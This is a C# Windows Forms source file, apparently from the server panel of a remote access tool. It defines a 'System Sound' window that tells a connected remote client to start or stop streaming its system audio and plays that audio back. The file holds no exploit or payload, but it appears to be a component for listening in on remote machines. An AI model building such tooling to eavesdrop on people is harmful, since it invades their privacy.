using System;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Windows.Forms;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using NAudio.Wave;
using NAudio.Wave.SampleProviders;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormSystemSound : FormMaterial
{
	public WaveOut waveOut;

	public BufferedWaveProvider bufferedWaveProvider;

	public VolumeSampleProvider volumeSampleProvider;

	public Clients client;

	public Clients parrent;

	private IContainer components;

	public MaterialSwitch materialSwitch1;

	public TrackBar trackBar1;

	public Timer timer1;

	public FormSystemSound()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormSystemSound_Load(object sender, EventArgs e)
	{
		timer1.Start();
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (waveOut != null)
		{
			waveOut.Stop();
			waveOut.Dispose();
		}
		if (bufferedWaveProvider != null)
		{
			bufferedWaveProvider = null;
		}
		if (client != null)
		{
			client.Disconnect();
		}
	}

	private void materialSwitch1_CheckedChanged(object sender, EventArgs e)
	{
		if (materialSwitch1.Checked)
		{
			bufferedWaveProvider = new BufferedWaveProvider(new WaveFormat(48000, 16, 2));
			bufferedWaveProvider.DiscardOnBufferOverflow = true;
			client.Send(LEB128.Write(new object[1] { "Start" }));
			volumeSampleProvider = new VolumeSampleProvider(bufferedWaveProvider.ToSampleProvider());
			volumeSampleProvider.Volume = (float)trackBar1.Value / 100f;
			waveOut = new WaveOut();
			waveOut.Volume = 1f;
			waveOut.Init(volumeSampleProvider);
			waveOut.Play();
		}
		else
		{
			if (waveOut != null)
			{
				waveOut.Stop();
				waveOut.Dispose();
			}
			if (bufferedWaveProvider != null)
			{
				bufferedWaveProvider = null;
			}
			client.Send(LEB128.Write(new object[1] { "Stop" }));
		}
	}

	private void trackBar1_Scroll(object sender, EventArgs e)
	{
		if (materialSwitch1.Checked)
		{
			volumeSampleProvider.Volume = (float)trackBar1.Value / 10f;
		}
	}

	public void Buffer(byte[] e)
	{
		if (waveOut != null)
		{
			bufferedWaveProvider.AddSamples(e, 0, e.Count());
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (!parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.trackBar1 = new System.Windows.Forms.TrackBar();
		this.materialSwitch1 = new MaterialSkin.Controls.MaterialSwitch();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		((System.ComponentModel.ISupportInitialize)this.trackBar1).BeginInit();
		base.SuspendLayout();
		this.trackBar1.Enabled = false;
		this.trackBar1.Location = new System.Drawing.Point(25, 80);
		this.trackBar1.Maximum = 100;
		this.trackBar1.Name = "trackBar1";
		this.trackBar1.Size = new System.Drawing.Size(250, 45);
		this.trackBar1.TabIndex = 30;
		this.trackBar1.Value = 10;
		this.trackBar1.Scroll += new System.EventHandler(trackBar1_Scroll);
		this.materialSwitch1.AutoSize = true;
		this.materialSwitch1.Depth = 0;
		this.materialSwitch1.Enabled = false;
		this.materialSwitch1.Location = new System.Drawing.Point(25, 128);
		this.materialSwitch1.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch1.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch1.Name = "materialSwitch1";
		this.materialSwitch1.Ripple = true;
		this.materialSwitch1.Size = new System.Drawing.Size(92, 37);
		this.materialSwitch1.TabIndex = 29;
		this.materialSwitch1.Text = "Start";
		this.materialSwitch1.UseVisualStyleBackColor = true;
		this.materialSwitch1.CheckedChanged += new System.EventHandler(materialSwitch1_CheckedChanged);
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(335, 194);
		base.Controls.Add(this.trackBar1);
		base.Controls.Add(this.materialSwitch1);
		base.Name = "FormSystemSound";
		this.Text = "System Sound";
		base.Load += new System.EventHandler(FormSystemSound_Load);
		((System.ComponentModel.ISupportInitialize)this.trackBar1).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
